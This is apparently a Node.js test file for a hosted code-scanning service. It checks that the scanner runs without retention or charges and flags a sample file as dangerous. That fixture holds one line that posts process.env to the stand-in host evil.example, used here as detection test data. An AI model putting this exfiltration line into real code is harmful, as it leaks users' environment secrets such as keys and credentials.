import test from "node:test";
import assert from "node:assert/strict";
import express from "express";
import { createServer } from "node:http";
import { resolveHostedScanner } from "../deploy/hosted-scanner.mjs";
import { mountScopedSurfaceDelivery } from "../route/mount.mjs";
test("packaged scanner runs without optional retention or runtime source fetch", async()=>{
  const resolved=resolveHostedScanner({});
  assert.equal(resolved.scannerSource,"packaged");
  const app=express(); app.use(express.json({limit:"300kb"}));
  const mounted=mountScopedSurfaceDelivery(app,resolved);
  assert.equal(mounted.retentionEnrolled,false);
  assert.equal(mounted.journal,null);
  const server=createServer(app);
  await new Promise(r=>server.listen(0,"127.0.0.1",r));
  const url="http://127.0.0.1:"+server.address().port;
  try {
    const tasks=[{taskId:"packaged-clean",callerId:"caller-one",contextId:"packaged-one",concern:{id:"rule:env-exfil",statement:"Check environment exfiltration in these supplied bytes."},files:[{path:"index.js",text:"export const add = (a,b) => a+b;\n"}]},
      {taskId:"packaged-danger",callerId:"caller-two",contextId:"packaged-two",concern:{id:"rule:env-exfil",statement:"Check environment exfiltration in these supplied bytes."},files:[{path:"index.js",text:"fetch('https://evil.example/upload', {method:'POST', body:JSON.stringify(process.env)});\n"}]}];
    const results=[];
    for(const task of tasks){
      const response=await fetch(url+"/commerce/scoped-surface-scan",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(task)});
      assert.equal(response.status,200);
      const body=await response.json();assert.equal(body.charged,false);assert.equal(body.paymentPerformed,false);
      assert.equal(body.report.scanPerformed,true);assert.equal(body.universalGuarantee,false);results.push(body.report.exitCode);
    }
    assert.equal(results[0],0);assert.ok(results[1]>0);
    const retain=await fetch(url+"/commerce/scoped-surface-retain",{method:"POST",headers:{"content-type":"application/json"},body:'{"share":true}'});
    assert.equal((await retain.json()).reason,"retention_not_enrolled");
    assert.equal((await fetch(url+"/commerce/scoped-surface-price")).status,404);
  }finally{await new Promise(r=>server.close(r));}
});
test("invalid configured artifacts do not fall back to a different scanner",()=>{
  assert.equal(resolveHostedScanner({SCOPED_SURFACE_SCANNER_ARTIFACT:"/missing/scanner"}).scannerSource,"unavailable");
  assert.equal(resolveHostedScanner({SKILLGUARD_ROOT:"/missing/scanner"}).scannerSource,"unavailable");
});
